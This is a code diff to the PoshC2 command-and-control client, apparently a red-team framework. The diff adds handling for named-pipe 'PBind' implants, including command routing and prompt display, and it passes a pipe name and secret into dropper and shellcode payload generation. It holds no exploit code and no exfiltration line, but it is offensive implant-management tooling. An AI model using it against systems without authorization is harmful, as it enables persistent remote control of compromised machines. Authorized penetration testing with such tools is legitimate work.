@@ -3,7 +3,7 @@
 import sys, os, time, subprocess, traceback, signal, argparse, re
 from poshc2.client.Help import PRECOMMANDS, UXCOMMANDS, SHARPCOMMANDS, COMMANDS, pre_help
 from poshc2.Colours import Colours
-from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ModulesDirectory, Database, DatabaseType
+from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ModulesDirectory, Database, DatabaseType, PBindPipeName, PBindSecret
 from poshc2.server.Core import get_creds_from_params, print_good, print_bad, number_of_days
 from poshc2.client.reporting.HTML import generate_table, graphviz
 from poshc2.server.Payloads import Payloads
@@ -11,6 +11,7 @@ from poshc2.Utils import validate_sleep_time, randomuri, parse_creds, validate_k
 from poshc2.client.command_handlers.PyHandler import handle_py_command
 from poshc2.client.command_handlers.SharpHandler import handle_sharp_command
 from poshc2.client.command_handlers.PSHandler import handle_ps_command
+from poshc2.client.command_handlers.PbindHandler import handle_pbind_command
 from poshc2.client.cli.CommandPromptCompleter import FirstWordFuzzyWordCompleter
 from poshc2.client.Help import banner
 from prompt_toolkit import PromptSession
@@ -52,6 +53,8 @@ def get_implant_type_prompt_prefix(implant_id):
         pivot = pivot + ";D"
     if "Proxy" in pivot_original:
         pivot = pivot + ";P"
+    if "PBind" in pivot_original:
+        pivot = pivot + ";PB"
     return pivot
 
 
@@ -110,7 +113,9 @@ def implant_handler_command_loop(user, printhelp="", autohide=None):
                         Label = Label.strip()
                         sLabel = Colours.BLUE + "[" + Label + "]" + Colours.GREEN
 
-                    if nowMinus30Beacons > LastSeenTime and autohide:
+                    if "C#;PB" in Pivot:
+                        print(Colours.BLUE + "%s: Seen:%s | PID:%s | %s | URLID: %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeen, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
+                    elif nowMinus30Beacons > LastSeenTime and autohide:
                         pass
                     elif nowMinus10Beacons > LastSeenTime:
                         print(Colours.RED + "%s: Seen:%s | PID:%s | %s | URLID: %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeen, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
@@ -271,6 +276,9 @@ def run_implant_command(command, randomuri, implant_id, user):
     if implant_type.startswith("Python"):
         handle_py_command(command, user, randomuri, implant_id)
         return
+    elif implant_type.startswith("C# PBind"):
+        handle_pbind_command(command, user, randomuri, implant_id)
+        return        
     elif implant_type.startswith("C#"):
         handle_sharp_command(command, user, randomuri, implant_id)
         return
@@ -306,7 +314,15 @@ def implant_command_loop(implant_id, user):
                     prompt_commands = UXCOMMANDS
                 if implant.Pivot == 'C#':
                     prompt_commands = SHARPCOMMANDS
-                print(Colours.GREEN)
+                if 'PB' in implant.Pivot:
+                    style = Style.from_dict({
+                        '': '#008ECC',
+                    })
+                    session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+                    prompt_commands = SHARPCOMMANDS
+                    print(Colours.BLUE)
+                else:
+                    print(Colours.GREEN)                    
                 print("%s\\%s @ %s (PID:%s)" % (implant.Domain, implant.User, implant.Hostname, implant.PID))
                 command = session.prompt("%s %s> " % (get_implant_type_prompt_prefix(implant_id), implant_id), completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
                 if command == "back" or command == 'clear':
@@ -712,11 +728,13 @@ def do_createdaisypayload(user, command):
     daisyhostid = input("Select Daisy Implant Host: e.g. 5 ")
     daisyhost = get_implantbyid(daisyhostid)
     proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+    pbindsecret = PBindSecret
+    pbindpipename = PBindPipeName
 
     C2 = get_c2server_all()
     urlId = new_urldetails(name, C2.PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
     newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer,
-        "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId)
+        "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret)
     newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
     newPayload.CreateRaw(name)
     newPayload.CreateDroppers(name)
@@ -750,6 +768,8 @@ def do_createnewpayload(user, command, creds=None, shellcodeOnly = False):
     domain = domain.replace('http://', '')
     domainfront = input("Domain front hostname: jobs.azureedge.net ")
     proxyurl = input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
+    pbindsecret = input(f"PBind Secret: e.g {PBindSecret} ")
+    pbindpipename = input(f"PBind Pipe Name: e.g. {PBindPipeName} ")
 
     proxyuser = ""
     proxypass = ""
@@ -768,7 +788,7 @@ def do_createnewpayload(user, command, creds=None, shellcodeOnly = False):
     C2 = get_c2server_all()
 
     urlId = new_urldetails(name, comms_url, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, imurl, PayloadsDirectory, URLID = urlId)
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, imurl, PayloadsDirectory, URLID = urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret)
 
     newPayload.CreateDroppers("%s_" % name)
     newPayload.CreateShellcode("%s_" % name)
@@ -807,7 +827,11 @@ def do_use(user, command):
 
 def do_label_implant(user, command, randomuri):
     label = command.replace('label-implant', '').strip()
-    update_label(label, randomuri)
+    implant_type = get_implanttype(randomuri)
+    if "PB" in implant_type:
+        print("Cannot re-label a PBind implant at this time")
+    else:
+        update_label(label, randomuri)
 
 
 def do_remove_label(user, command, randomuri):
